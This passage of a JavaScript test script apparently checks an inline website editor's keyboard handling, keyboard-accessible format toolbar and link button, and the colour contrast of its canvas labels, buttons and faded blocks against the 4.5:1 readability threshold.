      keyboard = compileRendererHelper("src/renderer/editorKeyboard.ts");
    } catch (e) {
      record(
        "text fields keep editing keys while the editor is busy",
        false,
        e.message,
      );
    }
    if (keyboard) {
      const calls = [];
      const input = dom.window.document.createElement("input");
      dom.window.document.body.appendChild(input);
      input.focus();
      const busy = keyboard.createKeyboardHandler({
        getState: () => ({
          mode: "visual",
          currentViewport: "desktop",
          project: { path: "/p" },
          selectedId: "b1",
          selectedSectionId: "a",
        }),
        isBusy: () => true,
        modalController: { isOpen: () => false },
        openHelpModal: () => {},
        performSave: async () => {
          calls.push("save");
          return true;
        },
        setViewport: () => {},
        setMode: () => {},
        openFindReplaceModal: async () => {},
        updateUndoRedoButtons: () => {},
        doUndo: () => calls.push("undo"),
        doRedo: () => {},
        findSelectedBlock: () => ({
          id: "b1",
          type: "text",
          locked: false,
          props: {},
        }),
        findSection: () => ({
          id: "a",
          label: "S",
          locked: false,
          children: [],
        }),
        deselectCanvasSelection: () => {},
        setStatus: () => {},
        duplicateSelectedBlock: () => calls.push("dup"),
        duplicateSection: () => {},
        copySelectionToClipboard: () => {},
        cutSelectionToClipboard: async () => {},
        pasteFromClipboard: () => {},
        deleteBlock: async () => calls.push("delete"),
        deleteSection: async () => {},
        cmUndo: () => {},
        cmRedo: () => {},
      });
      const backspace = new dom.window.KeyboardEvent("keydown", {
        key: "Backspace",
        bubbles: true,
        cancelable: true,
      });
      busy.onKeydown(backspace);
      const fieldFocused = dom.window.document.activeElement === input;
      const undo = new dom.window.KeyboardEvent("keydown", {
        key: "z",
        ctrlKey: true,
        bubbles: true,
        cancelable: true,
      });
      busy.onKeydown(undo);
      const copy = new dom.window.KeyboardEvent("keydown", {
        key: "c",
        ctrlKey: true,
        bubbles: true,
        cancelable: true,
      });
      busy.onKeydown(copy);
      const save = new dom.window.KeyboardEvent("keydown", {
        key: "s",
        ctrlKey: true,
        bubbles: true,
        cancelable: true,
      });
      busy.onKeydown(save);
      input.remove();
      const del = new dom.window.KeyboardEvent("keydown", {
        key: "Delete",
        bubbles: true,
        cancelable: true,
      });
      busy.onKeydown(del);
      const canvasUndo = new dom.window.KeyboardEvent("keydown", {
        key: "z",
        ctrlKey: true,
        bubbles: true,
        cancelable: true,
      });
      busy.onKeydown(canvasUndo);
      record(
        "text fields keep editing keys while the editor is busy",
        fieldFocused &&
          !backspace.defaultPrevented &&
          !undo.defaultPrevented &&
          !copy.defaultPrevented &&
          save.defaultPrevented &&
          del.defaultPrevented &&
          canvasUndo.defaultPrevented &&
          calls.length === 0,
        `fieldFocused=${fieldFocused} backspace=${backspace.defaultPrevented} undo=${undo.defaultPrevented} copy=${copy.defaultPrevented} save=${save.defaultPrevented} delete=${del.defaultPrevented} canvasUndo=${canvasUndo.defaultPrevented} calls=${calls.join(",")}`,
      );
    }
  }

  // Tabbing to Bold used to drop the selection, so the command formatted
  // nothing. The toolbar must put that selection back before execCommand.
  {
    const previousBody = dom.window.document.body.innerHTML;
    try {
      const inline = compileRendererHelper("src/renderer/editorInlineEdit.ts");
      const controller = inline.createInlineEditController({
        setStatus() {},
        refreshIcons() {},
        handlePlainTextPaste() {},
        pushUndo() {},
        commitBlockChange() {},
        renderCanvas() {},
        renderProperties() {},
      });
      const root = dom.window.document.createElement("div");
      root.innerHTML = "<span id='phrase'>Hello</span>";
      dom.window.document.body.appendChild(root);
      const [target] = controller.attachInlineEditors(root, {
        id: "b1",
        type: "heading",
        props: { text: "Hello", level: "2", cls: "" },
      });
      target.dispatchEvent(
        new dom.window.MouseEvent("dblclick", { bubbles: true }),
      );
      const phrase = root.querySelector("#phrase");
      const text = phrase.firstChild;
      const range = dom.window.document.createRange();
      range.setStart(text, 0);
      range.setEnd(text, 5);
      const selection = dom.window.document.getSelection();
      selection.removeAllRanges();
      selection.addRange(range);
      dom.window.document.dispatchEvent(
        new dom.window.Event("selectionchange"),
      );
      selection.removeAllRanges();
      const bold = dom.window.document.querySelector(
        '.inline-format-btn[aria-label="Bold (Cmd/Ctrl+B)"]',
      );
      bold.focus();
      let command = "";
      let sawSelection = false;
      dom.window.document.execCommand = (cmd) => {
        command = String(cmd);
        const live = dom.window.document.getSelection();
        sawSelection =
          !!live &&
          live.rangeCount > 0 &&
          !live.isCollapsed &&
          phrase.contains(live.anchorNode);
        return true;
      };
      bold.dispatchEvent(
        new dom.window.KeyboardEvent("keydown", {
          key: "Enter",
          bubbles: true,
        }),
      );
      bold.dispatchEvent(new dom.window.MouseEvent("click", { bubbles: true }));
      const stillEditing = controller.isInlineEditing();
      const focusReturned = dom.window.document.activeElement === bold;
      record(
        "format toolbar keeps the selection when used from the keyboard",
        command === "bold" && sawSelection && stillEditing && focusReturned,
        `command=${command} sawSelection=${sawSelection} editing=${stillEditing} focus=${focusReturned}`,
      );
      controller.finishInlineEdit();
    } catch (error) {
      record(
        "format toolbar keeps the selection when used from the keyboard",
        false,
        error instanceof Error ? error.message : String(error),
      );
    } finally {
      dom.window.document.body.innerHTML = previousBody;
    }
  }

  // The format bar is a toolbar. Arrow keys move between its actions, and
  // only one of them is a tab stop. Moving must not apply a command.
  {
    const previousBody = dom.window.document.body.innerHTML;
    try {
      const inline = compileRendererHelper("src/renderer/editorInlineEdit.ts");
      let command = "";
      dom.window.document.execCommand = (cmd) => {
        command = String(cmd);
        return true;
      };
      const controller = inline.createInlineEditController({
        setStatus() {},
        refreshIcons() {},
        handlePlainTextPaste() {},
        pushUndo() {},
        commitBlockChange() {},
        renderCanvas() {},
        renderProperties() {},
      });
      const root = dom.window.document.createElement("div");
      root.innerHTML = "<span id='phrase'>Hello</span>";
      dom.window.document.body.appendChild(root);
      const [target] = controller.attachInlineEditors(root, {
        id: "b1",
        type: "heading",
        props: { text: "Hello", level: "2", cls: "" },
      });
      target.dispatchEvent(
        new dom.window.MouseEvent("dblclick", { bubbles: true }),
      );
      const doc = dom.window.document;
      const bold = doc.querySelector(
        '.inline-format-btn[aria-label="Bold (Cmd/Ctrl+B)"]',
      );
      const italic = doc.querySelector(
        '.inline-format-btn[aria-label="Italic (Cmd/Ctrl+I)"]',
      );
      const buttons = Array.from(
        doc.querySelectorAll(".inline-format-toolbar > .inline-format-btn"),
      );
      bold.focus();
      bold.dispatchEvent(
        new dom.window.KeyboardEvent("keydown", {
          key: "ArrowRight",
          bubbles: true,
        }),
      );
      const moved = doc.activeElement === italic;
      const roving =
        bold.tabIndex === -1 &&
        italic.tabIndex === 0 &&
        buttons.filter((button) => button.tabIndex === 0).length === 1;
      const stillEditing = controller.isInlineEditing();
      italic.dispatchEvent(
        new dom.window.KeyboardEvent("keydown", {
          key: "ArrowLeft",
          bubbles: true,
        }),
      );
      const returned = doc.activeElement === bold;
      const help = squashText(
        fs.readFileSync(
          path.join(ROOT, "src", "renderer", "HelpModal.tsx"),
          "utf8",
        ),
      );
      record(
        "format toolbar moves with the arrow keys without formatting",
        moved &&
          roving &&
          stillEditing &&
          returned &&
          command === "" &&
          help.includes(
            "Move between bold, italic, and link while the format toolbar is focused",
          ),
        `moved=${moved} roving=${roving} editing=${stillEditing} returned=${returned} command=${command || "none"} tabs=${buttons.map((button) => button.tabIndex).join(",")}`,
      );
      controller.finishInlineEdit();
    } catch (error) {
      record(
        "format toolbar moves with the arrow keys without formatting",
        false,
        error instanceof Error ? error.message : String(error),
      );
    } finally {
      dom.window.document.body.innerHTML = previousBody;
    }
  }

  // The address field used to apply only on Enter. A pointer user needs a
  // button, and that button must go through the same safe-url check.
  {
    const previousBody = dom.window.document.body.innerHTML;
    try {
      const inline = compileRendererHelper("src/renderer/editorInlineEdit.ts");
      const statuses = [];
      const controller = inline.createInlineEditController({
        setStatus(message) {
          statuses.push(String(message));
        },
        refreshIcons() {},
        handlePlainTextPaste() {},
        pushUndo() {},
        commitBlockChange() {},
        renderCanvas() {},
        renderProperties() {},
      });
      const root = dom.window.document.createElement("div");
      root.innerHTML = "<span id='phrase'>Hello</span>";
      dom.window.document.body.appendChild(root);
      const [target] = controller.attachInlineEditors(root, {
        id: "b1",
        type: "heading",
        props: { text: "Hello", level: "2", cls: "" },
      });
      target.dispatchEvent(
        new dom.window.MouseEvent("dblclick", { bubbles: true }),
      );
      const phrase = root.querySelector("#phrase");
      const text = phrase.firstChild;
      const range = dom.window.document.createRange();
      range.setStart(text, 0);
      range.setEnd(text, 5);
      const selection = dom.window.document.getSelection();
      selection.removeAllRanges();
      selection.addRange(range);
      dom.window.document.dispatchEvent(
        new dom.window.Event("selectionchange"),
      );
      const link = dom.window.document.querySelector(
        '.inline-format-btn[aria-label="Add link (Cmd/Ctrl+K)"]',
      );
      link.dispatchEvent(
        new dom.window.MouseEvent("mousedown", { bubbles: true }),
      );
      link.dispatchEvent(new dom.window.MouseEvent("click", { bubbles: true }));
      const input = dom.window.document.querySelector(
        ".inline-format-link input",
      );
      const apply = dom.window.document.querySelector(".inline-format-apply");
      input.value = "https://example.com/docs";
      let command = "";
      let commandValue = "";
      dom.window.document.execCommand = (cmd, _ui, value) => {
        command = String(cmd);
        commandValue = String(value ?? "");
        return true;
      };
      apply.dispatchEvent(
        new dom.window.MouseEvent("mousedown", { bubbles: true }),
      );
      apply.dispatchEvent(
        new dom.window.MouseEvent("click", { bubbles: true }),
      );
      const css = fs.readFileSync(
        path.join(ROOT, "src/renderer/styles.css"),
        "utf8",
      );
      const linkStart = css.indexOf(".inline-format-link .text");
      const linkEnd = css.indexOf(".inline-format-apply:hover");
      const linkCss =
        linkStart >= 0 && linkEnd > linkStart
          ? css.slice(linkStart, linkEnd)
          : "";
      const applyAt = linkCss.indexOf(".inline-format-apply");
      const textRule = applyAt >= 0 ? linkCss.slice(0, applyAt) : "";
      const applyRule = applyAt >= 0 ? linkCss.slice(applyAt) : "";
      const sized =
        /min-height:\s*24px/.test(textRule) &&
        /min-height:\s*24px/.test(applyRule) &&
        /min-width:\s*24px/.test(applyRule);
      record(
        "link address applies from the toolbar button",
        apply instanceof dom.window.HTMLButtonElement &&
          apply.type === "button" &&
          apply.getAttribute("aria-label") === "Apply link" &&
          apply.textContent === "Apply" &&
          command === "createLink" &&
          commandValue === "https://example.com/docs" &&
          statuses.includes("Added link.") &&
          sized,
        `type=${apply && apply.type} command=${command} value=${commandValue} status=${statuses.join("|")} sized=${sized}`,
      );
      controller.finishInlineEdit();
    } catch (error) {
      record(
        "link address applies from the toolbar button",
        false,
        error instanceof Error ? error.message : String(error),
      );
    } finally {
      dom.window.document.body.innerHTML = previousBody;
    }
  }

  // A block hidden on the current viewport used to sit at 55% opacity. Default
  // text then fell under 4.5:1 while it was still on the canvas to be edited.
  {
    try {
      const rh = await import(
        pathToFileURL(path.join(ROOT, "dist", "shared", "renderHelpers.js"))
          .href
      );
      const styles = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "styles.css"),
        "utf8",
      );
      const engine = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "zephusEngine.ts"),
        "utf8",
      );
      const plain = rh.mutedForegroundPercent(
        "#0f172a",
        "#ffffff",
        "#f8fafc",
        60,
      );
      const slate = rh.mutedForegroundPercent(
        "#475569",
        "#ffffff",
        "#f8fafc",
        60,
      );
      const channel = (value) => {
        const s = value / 255;
        return s <= 0.04045 ? s / 12.92 : ((s + 0.055) / 1.055) ** 2.4;
      };
      const luminance = (rgb) =>
        0.2126 * channel(rgb[0]) +
        0.7152 * channel(rgb[1]) +
        0.0722 * channel(rgb[2]);
      const ratio = (fg, bg) => {
        const hi = Math.max(luminance(fg), luminance(bg));
        const lo = Math.min(luminance(fg), luminance(bg));
        return (hi + 0.05) / (lo + 0.05);
      };
      const parse = (hex) => {
        const n = Number.parseInt(hex.slice(1), 16);
        return [(n >> 16) & 255, (n >> 8) & 255, n & 255];
      };
      const composite = (ink, plane, percent) =>
        ink.map((part, index) =>
          Math.round(
            part * (percent / 100) + plane[index] * (1 - percent / 100),
          ),
        );
      const ink = parse("#475569");
      const onWhite = ratio(
        composite(ink, parse("#ffffff"), slate),
        parse("#ffffff"),
      );
      const onCard = ratio(
        composite(ink, parse("#f8fafc"), slate),
        parse("#f8fafc"),
      );
      const rest =
        styles.match(/\.canvas \.block\.hidden-on-viewport,[\s\S]*?\}/)?.[0] ??
        "";
      const hover =
        styles.match(
          /\.canvas \.block\.hidden-on-viewport:hover,[\s\S]*?\}/,
        )?.[0] ?? "";
      record(
        "hidden viewport blocks stay readable",
        plain === 60 &&
          slate > 60 &&
          onWhite >= 4.5 &&
          onCard >= 4.5 &&
          rest.includes("var(--zephus-hidden-opacity, 0.6)") &&
          !/opacity:\s*0\.55/.test(rest) &&
          hover.includes("max(0.9, var(--zephus-hidden-opacity, 0.6))") &&
          engine.includes("--zephus-hidden-opacity") &&
          /mutedForegroundPercent\(\s*design\?\.foreground,\s*design\?\.background,\s*design\?\.surface,\s*60,/.test(
            engine,
          ),
        `plain=${plain} slate=${slate} white=${onWhite.toFixed(2)} card=${onCard.toFixed(2)}`,
      );
    } catch (error) {
      record(
        "hidden viewport blocks stay readable",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Locked blocks faded to 80% and locked sections to 82%. A slate that clears
  // 4.5:1 at full strength falls under it at 80%, and a mid gray does the
  // same to a section at 82%.
  {
    try {
      const rh = await import(
        pathToFileURL(path.join(ROOT, "dist", "shared", "renderHelpers.js"))
          .href
      );
      const styles = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "styles.css"),
        "utf8",
      );
      const engine = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "zephusEngine.ts"),
        "utf8",
      );
      const plainBlock = rh.mutedForegroundPercent(
        "#0f172a",
        "#ffffff",
        "#f8fafc",
        80,
      );
      const slateBlock = rh.mutedForegroundPercent(
        "#475569",
        "#ffffff",
        "#f8fafc",
        80,
      );
      const plainSection = rh.mutedForegroundPercent(
        "#0f172a",
        "#ffffff",
        "#f8fafc",
        82,
      );
      const graySection = rh.mutedForegroundPercent(
        "#5a5a5a",
        "#ffffff",
        "#f8fafc",
        82,
      );
      const channel = (value) => {
        const s = value / 255;
        return s <= 0.04045 ? s / 12.92 : ((s + 0.055) / 1.055) ** 2.4;
      };
      const luminance = (rgb) =>
        0.2126 * channel(rgb[0]) +
        0.7152 * channel(rgb[1]) +
        0.0722 * channel(rgb[2]);
      const ratio = (fg, bg) => {
        const hi = Math.max(luminance(fg), luminance(bg));
        const lo = Math.min(luminance(fg), luminance(bg));
        return (hi + 0.05) / (lo + 0.05);
      };
      const parse = (hex) => {
        const n = Number.parseInt(hex.slice(1), 16);
        return [(n >> 16) & 255, (n >> 8) & 255, n & 255];
      };
      const composite = (ink, plane, percent) =>
        ink.map((part, index) =>
          Math.round(
            part * (percent / 100) + plane[index] * (1 - percent / 100),
          ),
        );
      const slateOnWhite = ratio(
        composite(parse("#475569"), parse("#ffffff"), slateBlock),
        parse("#ffffff"),
      );
      const slateOnCard = ratio(
        composite(parse("#475569"), parse("#f8fafc"), slateBlock),
        parse("#f8fafc"),
      );
      const grayOnWhite = ratio(
        composite(parse("#5a5a5a"), parse("#ffffff"), graySection),
        parse("#ffffff"),
      );
      const grayOnCard = ratio(
        composite(parse("#5a5a5a"), parse("#f8fafc"), graySection),
        parse("#f8fafc"),
      );
      const blockRule =
        styles.match(/\.canvas \.block\.locked\s*\{[^}]+\}/)?.[0] ?? "";
      const sectionRule =
        styles.match(/\.canvas-section\.locked\s*\{[^}]+\}/)?.[0] ?? "";
      record(
        "locked canvas text stays readable",
        plainBlock === 80 &&
          slateBlock > 80 &&
          plainSection === 82 &&
          graySection > 82 &&
          slateOnWhite >= 4.5 &&
          slateOnCard >= 4.5 &&
          grayOnWhite >= 4.5 &&
          grayOnCard >= 4.5 &&
          blockRule.includes("var(--zephus-locked-block-opacity, 0.8)") &&
          !/opacity:\s*0\.8\s*;/.test(blockRule) &&
          sectionRule.includes("var(--zephus-locked-section-opacity, 0.82)") &&
          !/opacity:\s*0\.82\s*;/.test(sectionRule) &&
          /mutedForegroundPercent\(\s*design\?\.foreground,\s*design\?\.background,\s*design\?\.surface,\s*80,/.test(
            engine,
          ) &&
          /mutedForegroundPercent\(\s*design\?\.foreground,\s*design\?\.background,\s*design\?\.surface,\s*82,/.test(
            engine,
          ),
        `block=${plainBlock}/${slateBlock}@${slateOnWhite.toFixed(2)} section=${plainSection}/${graySection}@${grayOnWhite.toFixed(2)}`,
      );
    } catch (error) {
      record(
        "locked canvas text stays readable",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Light hidden-page names used #b45309. That amber is 4.21:1 on the bottom
  // of the rail (#e9ebf1) and 3.68:1 on the selected row's accent wash.
  {
    try {
      const styles = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "styles.css"),
        "utf8",
      );
      const tokenIn = (blockRe) => {
        const block = styles.match(blockRe)?.[0] ?? "";
        return block.match(/--warning-text\s*:\s*(#[0-9a-fA-F]{6})/)?.[1] ?? "";
      };
      const light = tokenIn(/\[data-theme="light"\]\s*\{[\s\S]*?\}/);
      const system = tokenIn(
        /@media \(prefers-color-scheme: light\)\s*\{\s*\[data-theme="system"\]\s*\{[\s\S]*?\}/,
      );
      const rules = [
        /\[data-theme="light"\] \.page-item\.hidden-page,[\s\S]*?\}/,
        /\[data-theme="light"\] \.git-panel \.g-m\s*\{[^}]+\}/,
        /\[data-theme="light"\] \.overview-pill\.warn\s*\{[^}]+\}/,
        /\[data-theme="system"\] \.page-item\.hidden-page,[\s\S]*?\}/,
        /\[data-theme="system"\] \.git-panel \.g-m\s*\{[^}]+\}/,
        /\[data-theme="system"\] \.overview-pill\.warn\s*\{[^}]+\}/,
      ].map((re) => styles.match(re)?.[0] ?? "");
      const usesToken = rules.every(
        (rule) =>
          /color:\s*var\(--warning-text\)/.test(rule) &&
          !rule.includes("#b45309"),
      );
      const channel = (value) => {
        const s = value / 255;
        return s <= 0.04045 ? s / 12.92 : ((s + 0.055) / 1.055) ** 2.4;
      };
      const luminance = (rgb) =>
        0.2126 * channel(rgb[0]) +
        0.7152 * channel(rgb[1]) +
        0.0722 * channel(rgb[2]);
      const ratio = (fg, bg) => {
        const hi = Math.max(luminance(fg), luminance(bg));
        const lo = Math.min(luminance(fg), luminance(bg));
        return (hi + 0.05) / (lo + 0.05);
      };
      const parse = (hex) => {
        const n = Number.parseInt(hex.slice(1), 16);
        return [(n >> 16) & 255, (n >> 8) & 255, n & 255];
      };
      const mix = (fg, bg, amount) =>
        fg.map((part, index) =>
          Math.round(part * amount + bg[index] * (1 - amount)),
        );
      const rail = parse("#e9ebf1");
      const selected = mix(parse("#4f46e5"), rail, 0.1);
      const badge = mix(parse("#f59e0b"), parse("#ffffff"), 0.12);
      const planes = [rail, selected, badge];
      const readable = [light, system].every((hex) => {
        const ink = /^#[0-9a-fA-F]{6}$/.test(hex) ? parse(hex) : null;
        return !!ink && planes.every((plane) => ratio(ink, plane) >= 4.5);
      });
      record(
        "hidden page labels stay readable on the light rail",
        usesToken && readable,
        `light=${light || "missing"} system=${system || "missing"} rules=${rules.filter(Boolean).length}`,
      );
    } catch (error) {
      record(
        "hidden page labels stay readable on the light rail",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Block and section names used the editor shell's accent text, then faded
  // to 28% and 38%. On a light page that text is about 2.5:1 at full strength.
  {
    try {
      const rh = await import(
        pathToFileURL(path.join(ROOT, "dist", "shared", "renderHelpers.js"))
          .href
      );
      const styles = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "styles.css"),
        "utf8",
      );
      const channel = (value) => {
        const s = value / 255;
        return s <= 0.04045 ? s / 12.92 : ((s + 0.055) / 1.055) ** 2.4;
      };
      const luminance = (rgb) =>
        0.2126 * channel(rgb[0]) +
        0.7152 * channel(rgb[1]) +
        0.0722 * channel(rgb[2]);
      const ratio = (fg, bg) => {
        const hi = Math.max(luminance(fg), luminance(bg));
        const lo = Math.min(luminance(fg), luminance(bg));
        return (hi + 0.05) / (lo + 0.05);
      };
      const parse = (hex) => {
        const n = Number.parseInt(hex.slice(1), 16);
        return [(n >> 16) & 255, (n >> 8) & 255, n & 255];
      };
      const onSurface = (accent, background, surface) => {
        const ink = rh.accentInk(accent, background, surface);
        return /^#[0-9a-fA-F]{6}$/.test(ink)
          ? ratio(parse(ink), parse(surface))
          : 0;
      };
      const defaultChip = onSurface("#4f46e5", "#ffffff", "#f8fafc");
      const pinkChip = onSurface("#db2777", "#ffffff", "#f8fafc");
      const amberChip = onSurface("#b45309", "#fff7ed", "#fdf6ec");
      const chip = styles.match(/\.block-chip\s*\{[^}]+\}/)?.[0] ?? "";
      const crumb = styles.match(/\.block-breadcrumb\s*\{[^}]+\}/)?.[0] ?? "";
      const blockChrome = styles.match(/\.block-chrome\s*\{[^}]+\}/)?.[0] ?? "";
      const sectionChrome =
        styles.match(/\.section-chrome\s*\{[^}]+\}/)?.[0] ?? "";
      record(
        "canvas block labels stay readable on the page",
        defaultChip >= 4.5 &&
          pinkChip >= 4.5 &&
          amberChip >= 4.5 &&
          chip.includes("--zephus-surface") &&
          chip.includes("--zephus-accent-ink") &&
          !chip.includes("--accent-bg") &&
          !/color:\s*var\(--accent-text\)/.test(chip) &&
          crumb.includes("--zephus-foreground") &&
          crumb.includes("--zephus-meta-mix") &&
          !/color:\s*var\(--muted\)/.test(crumb) &&
          /opacity:\s*1\s*;/.test(blockChrome) &&
          !/opacity:\s*0\.28/.test(blockChrome) &&
          /opacity:\s*1\s*;/.test(sectionChrome) &&
          !/opacity:\s*0\.38/.test(sectionChrome),
        `default=${defaultChip.toFixed(2)} pink=${pinkChip.toFixed(2)} amber=${amberChip.toFixed(2)}`,
      );
    } catch (error) {
      record(
        "canvas block labels stay readable on the page",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // An empty page and an empty section used the editor's near-white text on
  // the site background. "Add section" was also left at 42% opacity.
  {
    try {
      const styles = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "styles.css"),
        "utf8",
      );
      const channel = (value) => {
        const s = value / 255;
        return s <= 0.04045 ? s / 12.92 : ((s + 0.055) / 1.055) ** 2.4;
      };
      const luminance = (rgb) =>
        0.2126 * channel(rgb[0]) +
        0.7152 * channel(rgb[1]) +
        0.0722 * channel(rgb[2]);
      const ratio = (fg, bg) => {
        const hi = Math.max(luminance(fg), luminance(bg));
        const lo = Math.min(luminance(fg), luminance(bg));
        return (hi + 0.05) / (lo + 0.05);
      };
      const parse = (hex) => {
        const n = Number.parseInt(hex.slice(1), 16);
        return [(n >> 16) & 255, (n >> 8) & 255, n & 255];
      };
      const shellOnPage = ratio(parse("#f3f4f8"), parse("#ffffff"));
      const mutedOnPage = ratio(parse("#9da5b8"), parse("#ffffff"));
      const bodyOnPage = ratio(parse("#0f172a"), parse("#ffffff"));
      const mutedOnPanel = ratio(parse("#9da5b8"), parse("#10131c"));
      const empty =
        styles.match(
          /\.canvas-empty,\s*\.canvas-empty-state\s*\{[^}]+\}/,
        )?.[0] ?? "";
      const heading =
        styles.match(/\.canvas-empty-state h3\s*\{[^}]+\}/)?.[0] ?? "";
      const secondary =
        styles.match(
          /\.canvas-empty span,\s*\.canvas-empty-state p\s*\{[^}]+\}/,
        )?.[0] ?? "";
      const addSection =
        styles.match(
          /\.section-insert \.canvas-insert-button\s*\{[^}]+\}/,
        )?.[0] ?? "";
      record(
        "empty canvas copy stays readable",
        shellOnPage < 4.5 &&
          mutedOnPage < 4.5 &&
          bodyOnPage >= 4.5 &&
          mutedOnPanel >= 4.5 &&
          /color:\s*var\(--zephus-foreground/.test(empty) &&
          !/color:\s*var\(--muted\)/.test(empty) &&
          /color:\s*var\(--zephus-foreground/.test(heading) &&
          !/color:\s*var\(--text\)/.test(heading) &&
          secondary.includes("--zephus-meta-mix") &&
          secondary.includes("--zephus-foreground") &&
          /opacity:\s*1\s*;/.test(addSection) &&
          !/opacity:\s*0\.42/.test(addSection),
        `shell=${shellOnPage.toFixed(2)} muted=${mutedOnPage.toFixed(2)} body=${bodyOnPage.toFixed(2)} panel=${mutedOnPanel.toFixed(2)}`,
      );
    } catch (error) {
      record(
        "empty canvas copy stays readable",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // A canvas link is accent ink so it can be read on the page. That same rule
  // outranks the filled button, so the label was ink on the accent fill.
  {
    try {
      const rh = await import(
        pathToFileURL(path.join(ROOT, "dist", "shared", "renderHelpers.js"))
          .href
      );
      const styles = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "styles.css"),
        "utf8",
      );
      const anchorAt = styles.indexOf(".canvas .block a[href]");
      const buttonAt = styles.indexOf(
        ".canvas .block a.button:not(.secondary)",
      );
      const buttonEnd = styles.indexOf("}", buttonAt);
      const buttonRule =
        buttonAt >= 0 && buttonEnd > buttonAt
          ? styles.slice(buttonAt, buttonEnd)
          : "";
      const channel = (value) => {
        const s = value / 255;
        return s <= 0.04045 ? s / 12.92 : ((s + 0.055) / 1.055) ** 2.4;
      };
      const luminance = (rgb) =>
        0.2126 * channel(rgb[0]) +
        0.7152 * channel(rgb[1]) +
        0.0722 * channel(rgb[2]);
      const ratio = (fg, bg) => {
        const hi = Math.max(luminance(fg), luminance(bg));
        const lo = Math.min(luminance(fg), luminance(bg));
        return (hi + 0.05) / (lo + 0.05);
      };
      const parse = (hex) => {
        const n = Number.parseInt(hex.slice(1), 16);
        return [(n >> 16) & 255, (n >> 8) & 255, n & 255];
      };
      const accent = "#4f46e5";
      const ink = String(
        rh.accentInk(accent, "#ffffff", "#f8fafc"),
      ).toLowerCase();
      const label = String(rh.onAccentText(accent)).toLowerCase();
      const inkOnFill = ratio(parse(ink), parse(accent));
      const labelOnFill = ratio(parse(label), parse(accent));
      record(
        "canvas button labels stay readable on the accent fill",
        anchorAt >= 0 &&
          buttonAt > anchorAt &&
          /color:\s*var\(--zephus-on-accent/.test(buttonRule) &&
          !/accent-ink/.test(buttonRule) &&
          inkOnFill < 4.5 &&
          labelOnFill >= 4.5,
        `ink=${ink}@${inkOnFill.toFixed(2)} label=${label}@${labelOnFill.toFixed(2)}`,
      );
    } catch (error) {
      record(
        "canvas button labels stay readable on the accent fill",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // A secondary button's outline used the editor chrome border. On a dark
  // page that line disappeared; the published button uses the site foreground.
  {
    try {
      const styles = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "styles.css"),
        "utf8",
      );
      const schema = fs.readFileSync(
        path.join(ROOT, "src", "main", "services", "schema.ts"),
        "utf8",
      );
      const start = styles.indexOf(".canvas .button.secondary {");
      const hoverAt = styles.indexOf(".canvas .button.secondary:hover");
      const rule =
        start >= 0 && hoverAt > start ? styles.slice(start, hoverAt) : "";
      const hoverEnd = styles.indexOf("}", hoverAt);
      const hover =
        hoverAt >= 0 && hoverEnd > hoverAt
          ? styles.slice(hoverAt, hoverEnd)
          : "";
      const publishedAt = schema.indexOf(".button.secondary {");
      const published = schema.slice(
        publishedAt,
        schema.indexOf(".button.secondary:hover"),
      );
      record(
        "canvas secondary buttons keep a visible outline",
        /color-mix\(/.test(rule) &&
          /--zephus-foreground/.test(rule) &&
          /16%/.test(rule) &&
          !/border-color:\s*var\(--border\)/.test(rule) &&
          /border-color:\s*var\(--zephus-accent/.test(hover) &&
          /color-mix\(in srgb, var\(--zephus-foreground\) 16%/.test(published),
        rule.includes("16%") ? "site mix" : "missing",
      );
    } catch (error) {
      record(
        "canvas secondary buttons keep a visible outline",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Pricing cards and accordion rules used the editor border. On a dark page
  // that line vanished; the published sheet uses a mix of the site text.
  {
    try {
      const styles = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "styles.css"),
        "utf8",
      );
      const schema = fs.readFileSync(
        path.join(ROOT, "src", "main", "services", "schema.ts"),
        "utf8",
      );
      const sliceRule = (source, startMarker, endMarker) => {
        const start = source.indexOf(startMarker);
        const end = endMarker
          ? source.indexOf(endMarker, start + startMarker.length)
          : source.indexOf("}", start);
        return start >= 0 && end > start ? source.slice(start, end) : "";
      };
      const accordion = sliceRule(
        styles,
        ".canvas .zephus-accordion details",
        ".canvas .zephus-accordion summary",
      );
      const pricing = sliceRule(
        styles,
        ".canvas .zephus-pricing {",
        ".canvas .zephus-price-amount",
      );
      const followsSite = (rule) =>
        /color-mix\(/.test(rule) &&
        /--zephus-foreground/.test(rule) &&
        /14%/.test(rule) &&
        !/var\(--border\)/.test(rule);
      const publishedAccordion = sliceRule(
        schema,
        ".zephus-accordion details",
        ".zephus-accordion summary",
      );
      const publishedPricing = sliceRule(
        schema,
        ".zephus-pricing {",
        ".zephus-pricing ul",
      );
      record(
        "canvas pricing and accordion lines follow the site text",
        followsSite(accordion) &&
          followsSite(pricing) &&
          /var\(--zephus-foreground\) 14%/.test(publishedAccordion) &&
          /var\(--zephus-foreground\) 14%/.test(publishedPricing),
        `accordion=${accordion.includes("14%")} pricing=${pricing.includes("14%")}`,
      );
    } catch (error) {
      record(
        "canvas pricing and accordion lines follow the site text",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Post titles inherit the heading color on the published page. The canvas
  // link rule is specific enough to underline them and recolor them instead.
  {
    try {
      const styles = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "styles.css"),
        "utf8",
      );
      const schema = fs.readFileSync(
        path.join(ROOT, "src", "main", "services", "schema.ts"),
        "utf8",
      );
      const themes = fs.readFileSync(
        path.join(ROOT, "src", "main", "themes.ts"),
        "utf8",
      );
      const anchorAt = styles.indexOf(".canvas .block a[href]");
      const titleAt = styles.indexOf(
        ".canvas .block .zephus-postlist-title a {",
      );
      const titleEnd = styles.indexOf("}", titleAt);
      const titleRule =
        titleAt >= 0 && titleEnd > titleAt
